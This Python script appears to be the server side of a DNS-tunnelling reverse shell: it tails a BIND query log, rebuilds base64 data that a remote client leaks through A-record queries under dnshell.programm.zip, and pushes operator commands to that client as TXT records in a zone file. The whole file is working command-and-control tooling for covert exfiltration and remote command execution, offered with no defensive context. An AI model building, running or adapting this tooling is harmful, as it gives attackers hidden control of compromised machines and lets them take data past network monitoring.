import subprocess
import re
import sys
import base64

def base64_decode_string(encoded_string):
    decoded_bytes = base64.b64decode(encoded_string)
    decoded_string = decoded_bytes.decode('utf-8')
    return decoded_string

logfile = "../bind/log/query.log"

# Define a regular expression pattern to match the log line
pattern = r"queries: client @\S+ (\d+\.\d+\.\d+\.\d+)#\d+ \((\S+)\): query: (\S+) (\S+) (\S+) \S+\ \((\d+\.\d+\.\d+\.\d+)\)"

# Start tailing the log file
p = subprocess.Popen(['tail', '-F', logfile], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

data = {}

domain = "dnshell.programm.zip"

def getData():
    waitingfordata = True
    # Loop through the output of tail
    while waitingfordata:
        line = p.stdout.readline()
        if line:
            # Convert the line to a string using the correct encoding
            line_str = line.decode()

            # Use the regular expression pattern to extract the relevant information from the log line
            match = re.findall(pattern, line_str)
            if match:
                # Extract the information from the match
                matches = match[0]
                query = {
                    "ip_address": matches[0],
                    "domain_name": matches[1],
                    "query_class": matches[3],
                    "query_type": matches[4],
                    "domain_parts": matches[1].replace(".dnshell.programm.zip", "").split(".")
                }           
                if query["query_type"] == "A":
                    thisdata = query["domain_parts"]
                    
                    print(f"New query arrived from {query['ip_address']} for {query['domain_name']}, type: {query['query_type']}, class: {query['query_class']}")
                    print(f"--- Recieved packet {thisdata[1]} of {thisdata[2]}")
                    
                    if not thisdata[3] in data:
                        data[thisdata[3]] = {}
                    data[thisdata[3]][int(thisdata[1])] = thisdata[0].replace("_", "=")
                    # if dictionairy data[thisdata[3]] has thisdata[2] amount of keys
                    if len(data[thisdata[3]]) == int(thisdata[2]):
                        print("--------------------- Data recieved ---------------------")
                        # Put the data together in one variable
                        datastring = ""
                        for i in range(0, int(thisdata[2])):
                            datastring += data[thisdata[3]][i]
                        print(f"Base64: {datastring}")
                        # decode base64
                        decoded = base64_decode_string(datastring)
                        print(f"Decoded: {decoded}")
                        waitingfordata = False
                        
                    else:
                        print(f"--- Still missing {int(thisdata[2]) - len(data[thisdata[3]])} packets")
                        
            else:
                print(f"No match {line_str}")
                
# Get input from user
print("Enter code:")
code = input()

filename = f"../bind/data/zones/revshell.{domain}.zone"

command = ""
counter = 0
while(command != "exit"):
    print("Enter command:")
    command = input()
    
    # send command to client
    zone = open(filename, "a")
    zone.write(f"""{counter}.{code}       IN      TXT      {command}\n""")
    zone.close()
    counter += 1